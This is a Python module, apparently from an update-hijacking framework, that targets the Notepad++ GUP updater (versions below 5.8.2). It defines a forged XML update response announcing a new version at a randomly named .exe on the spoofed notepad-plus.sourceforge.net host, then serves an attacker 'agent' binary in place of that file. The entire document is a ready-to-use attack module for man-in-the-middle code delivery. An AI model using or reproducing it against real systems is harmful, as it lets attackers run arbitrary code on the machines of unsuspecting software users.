from modules import ModuleBase


class notepadplus(ModuleBase):
    name = 'notepadplus'
    version = '1.0'
    appver = '< 5.8.2'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = """The notepad++ use GUP generic update process so it''s boggy too.""",
    vh = 'notepad-plus.sourceforge.net' 
    requests = [
        {   'path': 'getDownLoadUrl.php',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : "<?xml version=\"1.0\"?>\n<GUP>\n\t<NeedToBeUpdated>yes</NeedToBeUpdated>\n\t<Version>1<%RND1%>.0.0</Version>\n\t<Location>http://notepad-plus.sourceforge.net/<%RND2%>.exe</Location>\n</GUP>",
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }
    ]
    options = {
        'rnd1': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd2': {
            'val': 'rand_alpha(rand_num(1))',
            'hidden': 1,
            'dynamic': 1,
        }
    }